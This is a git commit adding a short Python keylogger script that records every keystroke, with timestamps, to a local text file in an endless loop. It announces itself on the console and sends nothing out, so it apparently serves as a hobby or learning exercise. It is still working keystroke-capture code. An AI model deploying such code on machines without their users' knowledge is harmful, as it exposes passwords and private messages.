6fe100109a789e1576122e22e6ffe87437b5e958
Shiaab <mirzashihab2@gmail.com>
2021-08-31 19:31:12 +0200

    new file

---
+++ keylogger/main.py
@@ -0,0 +1,38 @@
+import keyboard
+import datetime
+import os
+
+print("Key_logging session running...\nOpen file.txt to look at keys pressed...")
+try:
+
+    os.system("Del file.txt")
+
+except FileNotFoundError:
+
+    with open("file.txt", "w") as e:
+        pass
+
+finally:
+    with open("file.txt", "w") as f:
+        pass
+
+
+def initiate_key_logging():
+    event = keyboard.read_key()
+    with open("file.txt", "a") as keys_pressed:
+        keys_pressed.write(f"\n{str(datetime.datetime.now())}\n")
+        keys_pressed.write("--------This key was pressed at the above time------")
+        keys_pressed.write(f"\n{str(event)}\n")
+
+
+run = True
+while run is True:
+
+    initiate_key_logging()
+
+
+
+
+
+
+
